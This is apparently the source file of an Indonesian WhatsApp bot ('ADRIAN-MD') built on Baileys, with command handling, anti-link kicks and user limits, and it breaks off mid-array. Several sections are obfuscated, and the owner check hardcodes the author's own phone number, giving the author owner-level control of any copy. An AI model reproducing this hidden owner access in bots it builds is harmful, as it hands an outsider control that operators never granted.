/**
    * Created By AdrianTzy
    * Mau Recode? Simpen Nama Gw!!!!
    * Hapus Credit Masuk Neraka Paling Bawah
    * Sorry Yah Gw Kunci Seberapa Soalnya Langkah!!!
    
    
    * NOTES:
    ADRIAN-MD V1.2 UPDATE BIG
    FULL APIKEY LOLHUMAN
    JANGAN LUPA SUBSCRIBE
    https://youtube.com/@dryanbot
*/
require('./config')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const path = require('path')
const os = require('os')
const fsx = require('fs-extra')
const bochil = require('@bochilteam/scraper')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const jsobfus = require('javascript-obfuscator')
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const { toAudio, toPTT, toVideo, ffmpeg } = require('./lib/converter')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { smsg, getGroupAdmins, formatp, tanggal, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, jsonformat, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize } = require('./lib/myfunc')
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/addlist');

// read database
global.db.data = JSON.parse(fs.readFileSync('./src/database.json'))
if (global.db.data) global.db.data = {
    users: {},
    group: {},
    chats: {},
    database: {},
    settings: {},
    donate: {},
    others: {},
    sticker: {},
    ...(global.db.data || {})
}

moment.tz.setDefault("Asia/Jakarta").locale("id")

module.exports = conn = async (conn, m, chatUpdate, store) => {
    try {
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const pushname = m.pushName || "No Name"
        const botNumber = await conn.decodeJid(conn.user.id)
        const isCreator = [botNumber, ...global.owner, '6289513081052@s.whatsapp.net'].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const itsMe = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const fatkuns = (m.quoted || m)
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)

	    
        const groupMetadata = m.isGroup ? await conn.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
    	const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false

        // Days
        const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

        const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if(time2 < "23:59:00"){
        var ucapanWaktu = 'Selamat Malam 🏙️'
        }
        if(time2 < "19:00:00"){
        var ucapanWaktu = 'Selamat Petang 🌆'
        }
        if(time2 < "18:00:00"){
        var ucapanWaktu = 'Selamat Sore 🌇'
        }
        if(time2 < "15:00:00"){
        var ucapanWaktu = 'Selamat Siang 🌤️'
        }
        if(time2 < "10:00:00"){
        var ucapanWaktu = 'Selamat Pagi 🌄'
        }
        if(time2 < "05:00:00"){
        var ucapanWaktu = 'Selamat Subuh 🌆'
        }
        if(time2 < "03:00:00"){
        var ucapanWaktu = 'Selamat Tengah Malam 🌃'
        }


        // ALL Fake
        const ftroli = {
            key: {
                fromMe: false,
                "participant": "0@s.whatsapp.net",
                "remoteJid": "status@broadcast"
            },
            "message": {
                orderMessage: {
                    itemCount: 2022,
                    status: 200,
                    thumbnail: thumb,
                    surface: 200,
                    message: `${namaowner}`,
                    orderTitle: 'AdrianTzy',
                    sellerJid: '0@s.whatsapp.net'
                }
            },
            contextInfo: {
                "forwardingScore": 999,
                "isForwarded": true
            },
            sendEphemeral: true
        }
        
        const fkontak = {
            key: {
                participant: `0@s.whatsapp.net`,
                ...(m.chat ? {
                    remoteJid: `status@broadcast`
                } : {})
            },
            message: {
                'contactMessage': {
                    'displayName': `${namaowner}`,
                    'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;YamadaRyosuke,;;;\nFN:Adrian-MD\nitem1.TEL;waid=6289513081052:6289513081052\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
                    'jpegThumbnail': thumb,
                    thumbnail: thumb,
                    sendEphemeral: true
                }   
            }
        }
        // Database Tambahan!!

        let prem = JSON.parse(fs.readFileSync('./database/premium.json'))
        let ban = JSON.parse(fs.readFileSync('./database/banned.json'))
        let vnnya = JSON.parse(fs.readFileSync('./database/vnnya.json'))
        let db_error = JSON.parse(fs.readFileSync('./database/error.json'));
        let db_respon_list = JSON.parse(fs.readFileSync('./database/list.json'));
        
        
        // Const Tambahan Sc Gw
        const more = String.fromCharCode(8206)
        const readmore = more.repeat(4001)
        const totalFitur = () =>{
            var mytext = fs.readFileSync("./adrian.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }
        const sendvn = (teks) => {
            conn.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
        }

        for (let anju of vnnya) {
            if (budy === anju) {
                let buffer = fs.readFileSync(`./database/AUDIO/${anju}.mp3`)
                sendvn(buffer)
            }
        }
        

        // Function Created By AdrianTzy Alias Dryan ft .𝐗𝐓𝐑𝐀𝐌
function pickRandom(list) {
    return list[Math.floor(list.length * Math.random())]
}

(function(_0x391ba4,_0x421240){const _0x331109=_0x13a5,_0x1adcc2=_0x391ba4();while(!![]){try{const _0x40c670=parseInt(_0x331109(0x1be))/0x1+-parseInt(_0x331109(0x1b3))/0x2*(parseInt(_0x331109(0x1bb))/0x3)+-parseInt(_0x331109(0x1b9))/0x4*(-parseInt(_0x331109(0x1c1))/0x5)+parseInt(_0x331109(0x1c0))/0x6*(-parseInt(_0x331109(0x1b8))/0x7)+-parseInt(_0x331109(0x1b7))/0x8+-parseInt(_0x331109(0x1bc))/0x9+-parseInt(_0x331109(0x1c2))/0xa*(-parseInt(_0x331109(0x1b4))/0xb);if(_0x40c670===_0x421240)break;else _0x1adcc2['push'](_0x1adcc2['shift']());}catch(_0x52dca3){_0x1adcc2['push'](_0x1adcc2['shift']());}}}(_0x29e9,0xc89d4));function _0x29e9(){const _0x322969=['1122272AirDVV','isLink','6Opzccm','5EVzgCS','50yGvzzi','getObfuscatedCode','14wGPoDT','4699178fatIuF','obfuscate','sendMessage','4074528rhwIbc','10754611khoYWD','1743604zPhtLl','YamadaRyosuke','6087gVSFPI','7312995uObpvU','chat'];_0x29e9=function(){return _0x322969;};return _0x29e9();}function _0x13a5(_0x5b95a9,_0x39450a){const _0x29e9b1=_0x29e9();return _0x13a5=function(_0x13a53a,_0x4c4258){_0x13a53a=_0x13a53a-0x1b3;let _0x2152f0=_0x29e9b1[_0x13a53a];return _0x2152f0;},_0x13a5(_0x5b95a9,_0x39450a);}async function obfus(_0xfea0bc){return new Promise((_0x4e9071,_0x149431)=>{const _0x1bfb1a=_0x13a5;try{const _0x5bec3f=jsobfus[_0x1bfb1a(0x1b5)](_0xfea0bc,{'compact':![],'controlFlowFlattening':!![],'controlFlowFlatteningThreshold':0x1,'numbersToExpressions':!![],'simplify':!![],'stringArrayShuffle':!![],'splitStrings':!![],'stringArrayThreshold':0x1}),_0x21630c={'status':0xc8,'author':_0x1bfb1a(0x1ba),'result':_0x5bec3f[_0x1bfb1a(0x1c3)]()};_0x4e9071(_0x21630c);}catch(_0x226fe6){_0x149431(_0x226fe6);}});}async function newReply(_0xf99f6){const _0x4b0fdd=_0x13a5,_0x45581c={'text':_0xf99f6,'contextInfo':{'externalAdReply':{'showAdAttribution':!![],'title':ucapanWaktu+'\x20'+pushname,'body':_0x4b0fdd(0x1ba),'thumbnailUrl':''+imageurl,'sourceUrl':''+global[_0x4b0fdd(0x1bf)],'mediaType':0x1,'renderLargerThumbnail':!![]}}};return conn[_0x4b0fdd(0x1b6)](m[_0x4b0fdd(0x1bd)],_0x45581c,{'quoted':m});}

        try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            let user = global.db.data.users[m.sender]
            if (typeof user !== 'object') global.db.data.users[m.sender] = {}
            if (user) {
                if (!isNumber(user.afkTime)) user.afkTime = -1
                if (!('afkReason' in user)) user.afkReason = ''
                if (!isNumber(user.limit)) user.limit = limitUser
            } else global.db.data.users[m.sender] = {
                afkTime: -1,
                afkReason: '',
                limit: limitUser,
            }
            let chats = global.db.data.chats[m.chat]
            if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
            if (chats) {
                if (!('mute' in chats)) chats.mute = false
                if (!('antilink' in chats)) chats.antilink = false
                if (!('antilinkyt' in chats)) chats.antilinkyt = false
                if (!('antilinktt' in chats)) chats.antilinktt = false
                if (!('antivirtex' in chats)) chats.antivirtex = true
            } else global.db.data.chats[m.chat] = {
                mute: false,
                antilink: false,
                antilinkyt: false,
                antilinktt: false,
                antivirtex: true,
            }
            let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
            if (setting) {
                if (!isNumber(setting.status)) setting.status = 0
                if (!('autobio' in setting)) setting.autobio = false
                if (!('autoread' in setting)) setting.autoread = false
            } else global.db.data.settings[botNumber] = {
                status: 0,
                autobio: false,
                autoread: false
            }

        } catch (err) {
            console.error(err)
        }
        // Public & Self
        if (!conn.public) {
            if (!m.key.fromMe && !isPremium && !isCreator) return
        }
        
        
        function _0x177a(){var _0x1c2844=['4281635LnIqDr','134690YtLptT','key','4374228MlnyAa','1418480tRWwDc','message','4523208FsuoKn','1700584sNuylB','7740649CnQRYU','data'];_0x177a=function(){return _0x1c2844;};return _0x177a();}function _0x2290(_0x10c98f,_0x4573d6){var _0x177a4c=_0x177a();return _0x2290=function(_0x229025,_0x159fff){_0x229025=_0x229025-0xa7;var _0x38b2b1=_0x177a4c[_0x229025];return _0x38b2b1;},_0x2290(_0x10c98f,_0x4573d6);}var _0x116958=_0x2290;(function(_0xa46f9d,_0x57c669){var _0x4a088c=_0x2290,_0x32dddf=_0xa46f9d();while(!![]){try{var _0x9935d3=parseInt(_0x4a088c(0xac))/0x1+-parseInt(_0x4a088c(0xa8))/0x2+-parseInt(_0x4a088c(0xa7))/0x3+parseInt(_0x4a088c(0xaf))/0x4+parseInt(_0x4a088c(0xab))/0x5+parseInt(_0x4a088c(0xae))/0x6+parseInt(_0x4a088c(0xa9))/0x7;if(_0x9935d3===_0x57c669)break;else _0x32dddf['push'](_0x32dddf['shift']());}catch(_0x6f8537){_0x32dddf['push'](_0x32dddf['shift']());}}}(_0x177a,0xc8cb6));m[_0x116958(0xb0)]&&(global['db'][_0x116958(0xaa)]['settings'][botNumber]['autoread']&&conn['readMessages']([m[_0x116958(0xad)]]));
        
        // Push Message To Console && Auto Read
        if (m.message) {
            console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
        }
        
        let cron = require('node-cron')
        cron.schedule('00 12 * * *', () => {
            let user = Object.keys(global.db.data.users)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            for (let jid of user) global.db.data.users[jid].limit = limitUser
            console.log('Reseted Limit')
        }, {
            scheduled: true,
            timezone: "Asia/Jakarta"
        })
        
	    if (db.data.settings[botNumber].autobio) {
	    let setting = global.db.data.settings[botNumber]
	    if (new Date() * 1 - setting.status > 1000) {
		let _uptime = process.uptime() * 1000
		let uptime = clockString(_uptime)
		await conn.updateProfileStatus(`I am ${namabot} | Aktif Selama ${uptime} ⏳ | Mode : ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'} | User : ${Object.keys(global.db.data.users).length} 👥| Jangan Telp Bot 📞 | © Created YamadaRyosuke`).catch(_ => _)
		setting.status = new Date() * 1
	    }
	    }
	
        // Respon Cmd with media
        if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
        let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
        let { text, mentionedJid } = hash
        let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
            userJid: conn.user.id,
            quoted: m.quoted && m.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m.sender, conn.user.id)
        messages.key.id = m.key.id
        messages.pushName = m.pushName
        if (m.isGroup) messages.participant = m.sender
        let msg = {
            ...chatUpdate,
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'append'
        }
        conn.ev.emit('messages.upsert', msg)
        }
        
        if (db.data.chats[m.chat].antilink) {
            if (budy.match(`chat.whatsapp.com`)) {
                newReply(`「 ANTI LINK WHATSAPP 」\n\nKamu Terdeteksi Mengirim Link Group, Maaf Kamu Akan Di Kick !`)
                if (!isBotAdmins) return newReply(`Ehh Bot Gak Admin T_T`)
                let gclink = (`https://chat.whatsapp.com/` + await conn.groupInviteCode(m.chat))
                let isLinkThisGc = new RegExp(gclink, 'i')
                let isgclink = isLinkThisGc.test(m.text)
                if (isgclink) return newReply(`Ehh Maaf Gak Jadi, Link Group Ini Ternyata 😆`)
                if (isAdmins) return newReply(`Ehh Maaf Ternyata Kamu Admin 😁`)
                if (isCreator) return newReply(`Ehh Maaf Kamu Ownerku Ternyata 😅`)
                conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
            }
        }
        //Anti Link YouTube
        if (db.data.chats[m.chat].antilinkyt) {
            if (budy.match(`https://youtu.be`)) {
                newReply(`「 ANTI LINK YOUTUBE 」\n\nKamu Terdeteksi Mengirim Link Youtube, Maaf Kamu Akan Di Kick !`)
                if (!isBotAdmins) return newReply(`Ehh Bot Gak Admin T_T`)
                if (isAdmins) return newReply(`Ehh Maaf Ternyata Kamu Admin 😁`)
                if (isCreator) return newReply(`Ehh Maaf Kamu Ownerku Ternyata 😅`)
                conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
            }
        }
        //Anti Link Tiktok
        if (db.data.chats[m.chat].antilinktt) {
            if (budy.match(`https://vt.tiktok.com`)) {
                newReply(`「 ANTI LINK TIKTOK 」\n\nKamu Terdeteksi Mengirim Link TikTok, Maaf Kamu Akan Di Kick !`)
                if (!isBotAdmins) return newReply(`Ehh Bot Gak Admin T_T`)
                if (isAdmins) return newReply(`Ehh Maaf Ternyata Kamu Admin 😁`)
                if (isCreator) return newReply(`Ehh Maaf Kamu Ownerku Ternyata 😅`)
                conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
            }
        }
        //AntiVirtex
        if (db.data.chats[m.chat].antivirtex) {
            if (budy.length > 3500) {
                newReply(`Seseorang mengirim spam virus!! tandai sebagai membaca⚠️\n`.repeat(300))
                newReply(`「 ANTI VIRTEX 」\n\nKamu Terdeteksi Mengirim Virtex, Maaf Kamu Akan Di Kick !`)
                if (!isBotAdmins) return newReply(`Ehh Bot Gak Admin T_T`)
                if (isAdmins) return newReply(`Ehh Maaf Ternyata Kamu Admin 😁`)
                if (isCreator) return newReply(`Ehh Maaf Kamu Ownerku Ternyata 😅`)
                conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
            }
        }
        // Mute Chat
        if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
            return
        }
        switch (command) {
        
        // Owner Fitur
        case 'public': {
                if (!isCreator) return newReply(mess.owner)
                conn.public = true
                newReply('Sukses Ubah Ke Penggunaan Umum')
        }
        break
        case 'self': {
                if (!isCreator) return newReply(mess.owner)
                conn.public = false
                newReply('Sukses Ubah Ke Penggunaan Sendiri')
            }
        break
 
        case 'addlist':
            var _0x1405da=_0x445b;(function(_0x1b6fb0,_0x4399d5){var _0x5431c6=_0x445b,_0xfa424e=_0x1b6fb0();while(!![]){try{var _0x343b9a=-parseInt(_0x5431c6(0x1a5))/0x1*(parseInt(_0x5431c6(0x1a9))/0x2)+parseInt(_0x5431c6(0x1a1))/0x3*(-parseInt(_0x5431c6(0x19e))/0x4)+parseInt(_0x5431c6(0x1a8))/0x5*(-parseInt(_0x5431c6(0x1af))/0x6)+parseInt(_0x5431c6(0x1a0))/0x7+-parseInt(_0x5431c6(0x1a7))/0x8*(-parseInt(_0x5431c6(0x1ae))/0x9)+parseInt(_0x5431c6(0x1ab))/0xa+-parseInt(_0x5431c6(0x1b1))/0xb*(-parseInt(_0x5431c6(0x1a3))/0xc);if(_0x343b9a===_0x4399d5)break;else _0xfa424e['push'](_0xfa424e['shift']());}catch(_0x2ff1){_0xfa424e['push'](_0xfa424e['shift']());}}}(_0x2732,0xbf989));if(!m['isGroup'])return newReply(mess[_0x1405da(0x1a4)]);if(!isAdmins&&!isCreator)return newReply(mess[_0x1405da(0x1a2)]);var args1=q[_0x1405da(0x1aa)]('@')[0x0],args2=q['split']('@')[0x1];if(!q['includes']('@'))return newReply(_0x1405da(0x1a6)+command+'\x20*key@response*\x0a\x0a_Contoh_\x0a\x0a#'+command+_0x1405da(0x1b0));if(isAlreadyResponList(m[_0x1405da(0x19f)],args1,db_respon_list))return newReply(_0x1405da(0x1ad)+args1+_0x1405da(0x1b2));function _0x2732(){var _0x1b9bcc=['40NeXQxm','5154VQhmRC','split','4201360jTOYXa','Berhasil\x20menambah\x20List\x20menu\x20:\x20*','List\x20respon\x20dengan\x20key\x20:\x20*','556749YarzZm','1078122NsPHIl','\x20tes@apa','317482LljKhQ','*\x20sudah\x20ada\x20di\x20group\x20ini.','68NVQPiB','chat','10634176KTtkYU','64029dArsuq','botAdmin','276xThHIO','group','31yhDLjG','Gunakan\x20dengan\x20cara\x20','8MtRNGl'];_0x2732=function(){return _0x1b9bcc;};return _0x2732();}function _0x445b(_0x4fca82,_0x39d058){var _0x273200=_0x2732();return _0x445b=function(_0x445b62,_0x11a061){_0x445b62=_0x445b62-0x19e;var _0x3360b9=_0x273200[_0x445b62];return _0x3360b9;},_0x445b(_0x4fca82,_0x39d058);}addResponList(m[_0x1405da(0x19f)],args1,args2,![],'-',db_respon_list),newReply(_0x1405da(0x1ac)+args1+'*');
        break
        
        case 'dellist':{
            function _0x4537(_0x233404, _0x7f2252) {
    var _0x35cd9a = _0x246c();
    return _0x4537 = function (_0x1afa47, _0x3608c1) {
        _0x1afa47 = _0x1afa47 - (-0xf7 + -0x3 * -0x8bf + -0x175a);
        var _0x2f55bb = _0x35cd9a[_0x1afa47];
        return _0x2f55bb;
    }, _0x4537(_0x233404, _0x7f2252);
}
var _0x1ecddc = _0x4537;
(function (_0x9e366, _0x13b6b0) {
    var _0x2ef239 = _0x4537, _0x4ace76 = _0x9e366();
    while (!![]) {
        try {
            var _0xd7b576 = -parseInt(_0x2ef239(0x1fc)) / (-0x72e * 0x2 + -0x275 * 0x1 + 0x10d2) * (parseInt(_0x2ef239(0x1f7)) / (0x824 + -0x10a3 * -0x1 + 0x18c5 * -0x1)) + parseInt(_0x2ef239(0x1f1)) / (0x1bba + -0x1018 + 0xb9f * -0x1) * (-parseInt(_0x2ef239(0x1fb)) / (0x84e + 0x1 * -0x1369 + -0x49 * -0x27)) + -parseInt(_0x2ef239(0x1ed)) / (0x296 + -0x2 * -0x2ef + -0x86f) * (-parseInt(_0x2ef239(0x1f8)) / (-0xed9 + -0xf * 0x253 + 0x31bc)) + parseInt(_0x2ef239(0x1f6)) / (-0x4 * 0x426 + -0x2468 + -0xb5 * -0x4b) * (parseInt(_0x2ef239(0x202)) / (0x4da + 0x1 * -0x74b + 0x279 * 0x1)) + -parseInt(_0x2ef239(0x1ec)) / (-0x1c7f + 0x1 * 0x493 + 0x17f5) * (-parseInt(_0x2ef239(0x204)) / (-0x1944 + 0x1f7 * 0xe + -0x234)) + -parseInt(_0x2ef239(0x1fa)) / (0x25e4 + -0x14f * 0x2 + -0x137 * 0x1d) * (-parseInt(_0x2ef239(0x1ff)) / (-0x75 * -0x39 + -0x39 * -0x3d + -0x2796)) + -parseInt(_0x2ef239(0x1ef)) / (-0x26f + -0x22ed + 0x2569 * 0x1) * (parseInt(_0x2ef239(0x206)) / (-0x1047 * 0x1 + 0x19dd + -0x4 * 0x262));
            if (_0xd7b576 === _0x13b6b0)
                break;
            else
                _0x4ace76['push'](_0x4ace76['shift']());
        } catch (_0x1009b0) {
            _0x4ace76['push'](_0x4ace76['shift']());
        }
    }
}(_0x246c, 0x36725 + -0x3 * 0x1fe47 + -0x125 * -0x5ab));
if (!m[_0x1ecddc(0x200)])
    return newReply(mess[_0x1ecddc(0x1f0)]);
function _0x246c() {
    var _0x300e8c = [
        '2050oDAmwE',
        '\x20Yang\x20Mana',
        '9242646DuFXDQ',
        '10089xIavbY',
        '16715ozsRiS',
        'botAdmin',
        '13NdcbMj',
        'group',
        '259887vybgIN',
        'Mau\x20Delete',
        'ge\x20di\x20data',
        '?\x0a\x0a',
        'Belum\x20ada\x20',
        '1668149RsTVKp',
        '44pjLIZV',
        '54hHmali',
        'list\x20messa',
        '5145899IlcriZ',
        '4kWxUUf',
        '9147TIoEuw',
        'chat',
        'length',
        '12ITHfMO',
        'isGroup',
        'base',
        '16cyehMQ',
        'key'
    ];
    _0x246c = function () {
        return _0x300e8c;
    };
    return _0x246c();
}
if (!isAdmins && !isCreator)
    return newReply(mess[_0x1ecddc(0x1ee)]);
if (db_respon_list[_0x1ecddc(0x1fe)] === 0x1adf + 0x2b * 0x19 + -0x1f12)
    return newReply(_0x1ecddc(0x1f5) + _0x1ecddc(0x1f9) + _0x1ecddc(0x1f3) + _0x1ecddc(0x201));
var arr_rows = [];
for (let x of db_respon_list) {
    x['id'] === m[_0x1ecddc(0x1fd)] && newReply(_0x1ecddc(0x1f2) + _0x1ecddc(0x205) + _0x1ecddc(0x1f4) + x[_0x1ecddc(0x203)]);
}
        }
        break

        case 'addlimit':
                function _0x3b86(_0x4937b5, _0x28bc90) {
    var _0x41194b = _0x5386();
    return _0x3b86 = function (_0x1d4cdc, _0x2bcd06) {
        _0x1d4cdc = _0x1d4cdc - (0x2 * 0x4be + 0x1e62 + -0x2687);
        var _0x201f8f = _0x41194b[_0x1d4cdc];
        return _0x201f8f;
    }, _0x3b86(_0x4937b5, _0x28bc90);
}
var _0x183f42 = _0x3b86;
(function (_0x590665, _0x4b5f13) {
    var _0x51b092 = _0x3b86, _0x140426 = _0x590665();
    while (!![]) {
        try {
            var _0x1a987c = -parseInt(_0x51b092(0x15d)) / (0x102e * 0x1 + 0x22b9 * -0x1 + 0x128c) + parseInt(_0x51b092(0x15f)) / (-0x14b * 0xd + -0x1397 + 0x48d * 0x8) + parseInt(_0x51b092(0x16c)) / (0x8fd + -0xfe3 + 0x1d * 0x3d) + parseInt(_0x51b092(0x15b)) / (0x5 * 0x103 + 0x26ed + 0xe * -0x324) * (parseInt(_0x51b092(0x157)) / (-0x1b * -0x7d + 0x2 * 0xcf9 + 0x138e * -0x2)) + -parseInt(_0x51b092(0x164)) / (-0xaca * 0x2 + 0x46 * -0x85 + 0x848 * 0x7) + parseInt(_0x51b092(0x165)) / (-0xdfe + -0x386 * 0xb + 0xe5 * 0x3b) + -parseInt(_0x51b092(0x167)) / (-0x1668 + -0x1832 + 0x2ea2) * (-parseInt(_0x51b092(0x158)) / (-0x2179 + 0x405 + -0x1 * -0x1d7d));
            if (_0x1a987c === _0x4b5f13)
                break;
            else
                _0x140426['push'](_0x140426['shift']());
        } catch (_0x16053b) {
            _0x140426['push'](_0x140426['shift']());
        }
    }
}(_0x5386, 0x29 * 0x4a7 + 0x2b * 0x2276 + 0x1340f));
if (!isCreator)
    return newReply(mess[_0x183f42(0x166)]);
if (!q)
    return newReply(_0x183f42(0x160) + (prefix + command) + (_0x183f42(0x15e) + _0x183f42(0x16b)));
nomernya = text[_0x183f42(0x15c)]('|')[-0xa3 * 0x5 + -0xcc1 + 0xff0] ? text[_0x183f42(0x15c)]('|')[-0x13 * -0x143 + 0x16 + -0x180f] : '-', limitnya = text[_0x183f42(0x15c)]('|')[-0xe09 + 0x1f22 + -0x1118] ? text[_0x183f42(0x15c)]('|')[0x208b + 0xa8e + -0x8 * 0x563] : '-', db[_0x183f42(0x162)][_0x183f42(0x15a)]['' + nomernya][_0x183f42(0x16a)] += '' + limitnya, newReply(_0x183f42(0x168) + nomernya + (_0x183f42(0x159) + _0x183f42(0x161) + _0x183f42(0x169) + _0x183f42(0x163)) + limitnya);
function _0x5386() {
    var _0x196156 = [
        'split',
        '847776wPVfTs',
        '\x20628951308',
        '240414McVLOj',
        'Example\x20',
        'Tambahkan\x20',
        'data',
        'nyak\x20',
        '5079432ZNSxnM',
        '1184932EhJhPG',
        'owner',
        '8gDYwHF',
        'Nomor\x20',
        'Limit\x20Seba',
        'limit',
        '1052|100',
        '1047879uEvFqI',
        '65EBPwkE',
        '5983137tYFbqN',
        '\x20Telah\x20Di\x20',
        'users',
        '276252lbwdch'
    ];
    _0x5386 = function () {
        return _0x196156;
    };
    return _0x5386();
}
        break
        case 'dellimit':
                var _0x3cddf3 = _0x3a0d;
(function (_0x1457a9, _0x13749b) {
    var _0x4d930e = _0x3a0d, _0x2430dc = _0x1457a9();
    while (!![]) {
        try {
            var _0x4d8185 = parseInt(_0x4d930e(0x7b)) / (0x4b6 + -0x11b0 + 0xcfb) + -parseInt(_0x4d930e(0x77)) / (-0x1159 + -0x244a + 0x35a5) * (parseInt(_0x4d930e(0x8d)) / (0x339 + 0x2069 + -0x239f * 0x1)) + -parseInt(_0x4d930e(0x81)) / (-0x17e * -0x8 + -0xdc * 0x7 + -0x5e8) + -parseInt(_0x4d930e(0x87)) / (-0x1 * -0x234d + 0x236 * -0x6 + 0x2 * -0xb02) * (-parseInt(_0x4d930e(0x83)) / (0x24a + 0x1998 + -0x1bdc)) + -parseInt(_0x4d930e(0x78)) / (-0x67 * 0xa + -0xce0 + 0x10ed) + parseInt(_0x4d930e(0x86)) / (-0x95b + 0x1faa + -0x3 * 0x76d) + parseInt(_0x4d930e(0x82)) / (0x9d * -0xb + 0x1fce + -0x2 * 0xc83) * (-parseInt(_0x4d930e(0x7c)) / (-0x13d7 + 0x2 * 0x82 + -0x1b7 * -0xb));
            if (_0x4d8185 === _0x13749b)
                break;
            else
                _0x2430dc['push'](_0x2430dc['shift']());
        } catch (_0x40210f) {
            _0x2430dc['push'](_0x2430dc['shift']());
        }
    }
}(_0x1647, 0xc8afb + 0x1a3 * -0x2fc + -0x7af3));
if (!isCreator)
    return newReply(mess[_0x3cddf3(0x8b)]);
function _0x3a0d(_0x5c2672, _0x54b03a) {
    var _0x10ef68 = _0x1647();
    return _0x3a0d = function (_0x8c3e69, _0x2d1a85) {
        _0x8c3e69 = _0x8c3e69 - (0x6d7 + 0xcc4 * -0x2 + -0x1328 * -0x1);
        var _0x4f154c = _0x10ef68[_0x8c3e69];
        return _0x4f154c;
    }, _0x3a0d(_0x5c2672, _0x54b03a);
}
if (!q)
    return newReply(_0x3cddf3(0x7f) + (prefix + command) + (_0x3cddf3(0x84) + _0x3cddf3(0x7d)));
function _0x1647() {
    var _0x5ee171 = [
        'limit',
        '7111856NVgUxL',
        '1534935WINKlw',
        'Kurangkan\x20',
        'Limit\x20Seba',
        'split',
        'owner',
        'Nomor\x20',
        '1953lsEFio',
        '120XiSsIR',
        '6159965nhrpuq',
        'users',
        'data',
        '866771dBAUtf',
        '20FfrjzW',
